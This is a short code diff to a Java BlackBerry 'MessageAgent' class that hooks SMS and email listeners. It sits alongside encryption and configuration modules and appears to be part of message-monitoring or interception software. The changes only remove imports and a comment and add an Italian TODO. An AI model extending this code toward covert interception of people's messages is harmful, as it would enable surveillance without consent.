@@ -14,7 +14,6 @@ import java.util.Date;
 import java.util.Vector;
 
 import javax.wireless.messaging.BinaryMessage;
-import javax.wireless.messaging.Message;
 import javax.wireless.messaging.TextMessage;
 
 import net.rim.blackberry.api.phone.Phone;
@@ -26,7 +25,6 @@ import blackberry.agent.mail.Filter;
 import blackberry.agent.mail.MailListener;
 import blackberry.agent.sms.SmsListener;
 import blackberry.config.Conf;
-import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -39,7 +37,7 @@ import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
-// TODO: Auto-generated Javadoc
+
 /*
  * http://rcs-dev/trac/browser/RCSASP/deps/Common/ASP_Common.h
  * 
@@ -190,6 +188,7 @@ public final class MessageAgent extends Agent implements SmsObserver {
             smsListener.addSmsObserver(this);
         }
 
+        //TODO: se l'email e' disabilitata non far partire il listener.
         if (mailEnabled) {
             mailListener.start();
         }
